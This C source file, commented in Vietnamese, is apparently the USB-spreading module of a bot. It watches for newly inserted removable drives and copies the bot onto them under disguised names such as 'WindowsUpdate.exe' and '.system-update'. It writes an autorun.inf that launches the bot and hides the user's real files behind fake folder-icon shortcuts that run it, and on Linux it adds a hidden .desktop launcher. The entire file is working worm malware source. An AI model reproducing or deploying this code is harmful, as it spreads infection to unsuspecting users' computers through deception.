/**
 * spreader_usb.c
 * Lan truyen qua USB: theo doi o dia USB moi, tao file LNK gia mao, autorun.inf
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
    #include <windows.h>
    #include <shlobj.h>
    #include <dbt.h>
#else
    #include <unistd.h>
    #include <sys/stat.h>
    #include <sys/mount.h>
    #include <dirent.h>
    #include <mntent.h>
#endif

#include "spreader_usb.h"

#ifdef _WIN32
/* ==================== WINDOWS USB SPREADER ==================== */

/* Cau truc de theo doi thiet bi */
static HDEVNOTIFY g_device_notify = NULL;
static char g_duong_dan_bot[1024] = {0};

/**
 * Lay duong dan cua bot hien tai
 */
static void lay_duong_dan_bot_spreader(void) {
    if (strlen(g_duong_dan_bot) > 0) return;
    GetModuleFileNameA(NULL, g_duong_dan_bot, sizeof(g_duong_dan_bot));
}

/**
 * Tao file Shortcut (LNK) gia mao
 * Dau vao: o_dia - ky tu o dia (vi du: "D:")
 *          ten_file_goc - ten file hoac thu muc can gia mao
 *          duong_dan_bot - duong dan den bot
 * Tra ve: 0 neu thanh cong, -1 neu that bai
 */
static int tao_shortcut_gia_mao(const char* o_dia, const char* ten_file_goc, 
                                 const char* duong_dan_bot) {
    char duong_dan_lnk[512];
    char duong_dan_muc_tieu[512];
    
    /* Tao duong dan cho file LNK */
    snprintf(duong_dan_lnk, sizeof(duong_dan_lnk), "%s\\%s.lnk", o_dia, ten_file_goc);
    snprintf(duong_dan_muc_tieu, sizeof(duong_dan_muc_tieu), "%s\\%s", o_dia, ten_file_goc);
    
    /* Su dung COM de tao Shortcut */
    HRESULT hres;
    IShellLinkA* pShellLink = NULL;
    IPersistFile* pPersistFile = NULL;
    
    hres = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hres)) return -1;
    
    hres = CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
                             &IID_IShellLinkA, (void**)&pShellLink);
    if (SUCCEEDED(hres)) {
        /* Dat thuoc tinh shortcut */
        pShellLink->lpVtbl->SetPath(pShellLink, duong_dan_bot);
        pShellLink->lpVtbl->SetArguments(pShellLink, "");
        pShellLink->lpVtbl->SetWorkingDirectory(pShellLink, o_dia);
        pShellLink->lpVtbl->SetDescription(pShellLink, "USB Drive");
        
        /* Dat icon giong thu muc */
        pShellLink->lpVtbl->SetIconLocation(pShellLink, 
            "C:\\Windows\\System32\\shell32.dll", 3); /* Folder icon */
        
        /* Luu shortcut */
        hres = pShellLink->lpVtbl->QueryInterface(pShellLink, 
            &IID_IPersistFile, (void**)&pPersistFile);
        
        if (SUCCEEDED(hres)) {
            WCHAR wide_path[512];
            MultiByteToWideChar(CP_ACP, 0, duong_dan_lnk, -1, wide_path, 512);
            pPersistFile->lpVtbl->Save(pPersistFile, wide_path, TRUE);
            pPersistFile->lpVtbl->Release(pPersistFile);
        }
        pShellLink->lpVtbl->Release(pShellLink);
    }
    
    CoUninitialize();
    
    /* An file/thu muc goc */
    SetFileAttributesA(duong_dan_muc_tieu, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    
    return 0;
}

/**
 * Tao file autorun.inf
 * Dau vao: o_dia - ky tu o dia
 *          duong_dan_bot - duong dan den bot
 * Tra ve: 0 neu thanh cong
 */
static int tao_autorun_inf(const char* o_dia, const char* duong_dan_bot) {
    char autorun_path[512];
    snprintf(autorun_path, sizeof(autorun_path), "%s\\autorun.inf", o_dia);
    
    FILE* f = fopen(autorun_path, "w");
    if (f == NULL) return -1;
    
    fprintf(f, "[AutoRun]\n");
    fprintf(f, "open=%s\n", duong_dan_bot);
    fprintf(f, "action=Open folder to view files\n");
    fprintf(f, "icon=%%SystemRoot%%\\System32\\shell32.dll,4\n");
    fprintf(f, "label=USB Drive\n");
    
    /* Them AutoPlay handler */
    fprintf(f, "[Autorun.NT5]\n");
    fprintf(f, "open=%s\n", duong_dan_bot);
    
    fclose(f);
    
    /* Dat thuoc tinh an + system + read-only */
    SetFileAttributesA(autorun_path, 
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
    
    return 0;
}

/**
 * Copy bot vao o dia USB
 * Dau vao: o_dia - ky tu o dia
 * Tra ve: 0 neu thanh cong
 */
static int copy_bot_vao_usb(const char* o_dia) {
    lay_duong_dan_bot_spreader();
    
    char dest_path[512];
    snprintf(dest_path, sizeof(dest_path), "%s\\WindowsUpdate.exe", o_dia);
    
    if (CopyFileA(g_duong_dan_bot, dest_path, FALSE)) {
        /* Dat thuoc tinh an */
        SetFileAttributesA(dest_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        return 0;
    }
    
    return -1;
}

/**
 * Xu ly o dia USB moi duoc cam vao
 * Dau vao: o_dia - ky tu o dia (vi du: "D:")
 * Tra ve: 0 neu thanh cong
 */
static int xu_ly_o_dia_usb(const char* o_dia) {
    printf("[USB] Phat hien o dia moi: %s\n", o_dia);
    
    /* Kiem tra o dia con trong */
    ULARGE_INTEGER free_bytes;
    if (!GetDiskFreeSpaceExA(o_dia, &free_bytes, NULL, NULL)) {
        return -1;
    }
    
    /* Kiem tra loai o dia (chi xu ly removable) */
    UINT drive_type = GetDriveTypeA(o_dia);
    if (drive_type != DRIVE_REMOVABLE && drive_type != DRIVE_CDROM) {
        return -1;
    }
    
    /* Copy bot vao USB */
    copy_bot_vao_usb(o_dia);
    
    /* Tao autorun.inf */
    tao_autorun_inf(o_dia, g_duong_dan_bot);
    
    /* Tim cac file/thu muc trong o dia de tao shortcut gia mao */
    char search_path[512];
    snprintf(search_path, sizeof(search_path), "%s\\*", o_dia);
    
    WIN32_FIND_DATAA find_data;
    HANDLE find_handle = FindFirstFileA(search_path, &find_data);
    
    if (find_handle != INVALID_HANDLE_VALUE) {
        do {
            if (strcmp(find_data.cFileName, ".") == 0 || 
                strcmp(find_data.cFileName, "..") == 0) {
                continue;
            }
            
            /* Bo qua file he thong */
            if (strstr(find_data.cFileName, "WindowsUpdate") != NULL) continue;
            if (strstr(find_data.cFileName, "autorun") != NULL) continue;
            
            /* Tao shortcut gia mao */
            char ten_file_khong_duoi[256];
            strncpy(ten_file_khong_duoi, find_data.cFileName, sizeof(ten_file_khong_duoi) - 1);
            
            /* Xoa duoi file */
            char* dau_cham = strrchr(ten_file_khong_duoi, '.');
            if (dau_cham != NULL && !(find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                *dau_cham = '\0';
            }
            
            tao_shortcut_gia_mao(o_dia, ten_file_khong_duoi, 
                                 g_duong_dan_bot);
            
        } while (FindNextFileA(find_handle, &find_data));
        FindClose(find_handle);
    }
    
    return 0;
}

/**
 * Theo doi su kien thiet bi moi (USB)
 */
static DWORD WINAPI thread_theo_doi_usb(LPVOID param) {
    (void)param;
    
    /* Kiem tra cac o dia hien tai */
    DWORD drives = GetLogicalDrives();
    char o_dia[4] = "A:\\";
    
    for (char c = 'A'; c <= 'Z'; c++) {
        o_dia[0] = c;
        if (drives & (1 << (c - 'A'))) {
            if (GetDriveTypeA(o_dia) == DRIVE_REMOVABLE) {
                xu_ly_o_dia_usb(o_dia);
            }
        }
    }
    
    /* Vong lap kiem tra o dia moi */
    DWORD drives_cu = drives;
    
    while (1) {
        Sleep(2000); /* Kiem tra moi 2 giay */
        
        DWORD drives_moi = GetLogicalDrives();
        
        if (drives_moi != drives_cu) {
            /* Co thay doi, kiem tra o dia moi */
            for (char c = 'A'; c <= 'Z'; c++) {
                o_dia[0] = c;
                DWORD mask = 1 << (c - 'A');
                
                if ((drives_moi & mask) && !(drives_cu & mask)) {
                    /* O dia moi xuat hien */
                    Sleep(1000); /* Cho o dia san sang */
                    xu_ly_o_dia_usb(o_dia);
                }
            }
            drives_cu = drives_moi;
        }
    }
    
    return 0;
}

/**
 * Khoi tao USB spreader
 */
int khoi_tao_usb_spreader(void) {
    lay_duong_dan_bot_spreader();
    
    /* Tao thread theo doi USB */
    HANDLE thread = CreateThread(NULL, 0, thread_theo_doi_usb, NULL, 0, NULL);
    if (thread != NULL) {
        CloseHandle(thread);
        return 0;
    }
    
    return -1;
}

#else
/* ==================== LINUX/MACOS USB SPREADER ==================== */

static char g_duong_dan_bot[1024] = {0};

static void lay_duong_dan_bot_spreader(void) {
    if (strlen(g_duong_dan_bot) > 0) return;
    ssize_t len = readlink("/proc/self/exe", g_duong_dan_bot, sizeof(g_duong_dan_bot) - 1);
    if (len != -1) {
        g_duong_dan_bot[len] = '\0';
    } else {
        strcpy(g_duong_dan_bot, "/tmp/.bot");
    }
}

/**
 * Kiem tra va xu ly USB moi
 */
static int xu_ly_usb_linux(const char* mount_point) {
    printf("[USB] Phat hien mount point: %s\n", mount_point);
    
    /* Copy bot vao USB */
    char dest_path[512];
    snprintf(dest_path, sizeof(dest_path), "%s/.system-update", mount_point);
    
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "cp \"%s\" \"%s\" 2>/dev/null && chmod +x \"%s\"",
             g_duong_dan_bot, dest_path, dest_path);
    system(cmd);
    
    /* Tao file .desktop gia mao */
    snprintf(cmd, sizeof(cmd), 
             "cat > \"%s/.autorun.desktop\" << 'EOF'\n"
             "[Desktop Entry]\n"
             "Name=Open Folder\n"
             "Exec=%s\n"
             "Type=Application\n"
             "Icon=folder\n"
             "NoDisplay=true\n"
             "Terminal=false\n"
             "EOF", mount_point, dest_path);
    system(cmd);
    
    /* An file */
    snprintf(cmd, sizeof(cmd), "chmod 644 \"%s/.autorun.desktop\"", mount_point);
    system(cmd);
    
    return 0;
}

/**
 * Vong lap theo doi USB
 */
static void* thread_theo_doi_usb_linux(void* param) {
    (void)param;
    
    while (1) {
        /* Kiem tra /media va /mnt */
        DIR* media = opendir("/media");
        if (media != NULL) {
            struct dirent* entry;
            while ((entry = readdir(media)) != NULL) {
                if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
                
                char mount_path[512];
                snprintf(mount_path, sizeof(mount_path), "/media/%s", entry->d_name);
                
                /* Kiem tra co phai mount point khong */
                struct stat st;
                if (stat(mount_path, &st) == 0 && S_ISDIR(st.st_mode)) {
                    /* Kiem tra co file danh dau da xu ly chua */
                    char da_xu_ly[512];
                    snprintf(da_xu_ly, sizeof(da_xu_ly), "%s/.c2_processed", mount_path);
                    
                    if (access(da_xu_ly, F_OK) != 0) {
                        xu_ly_usb_linux(mount_path);
                        /* Danh dau da xu ly */
                        FILE* f = fopen(da_xu_ly, "w");
                        if (f) fclose(f);
                    }
                }
            }
            closedir(media);
        }
        
        sleep(5); /* Kiem tra moi 5 giay */
    }
    return NULL;
}

int khoi_tao_usb_spreader(void) {
    lay_duong_dan_bot_spreader();
    
    pthread_t thread;
    pthread_create(&thread, NULL, thread_theo_doi_usb_linux, NULL);
    pthread_detach(thread);
    
    return 0;
}

#endif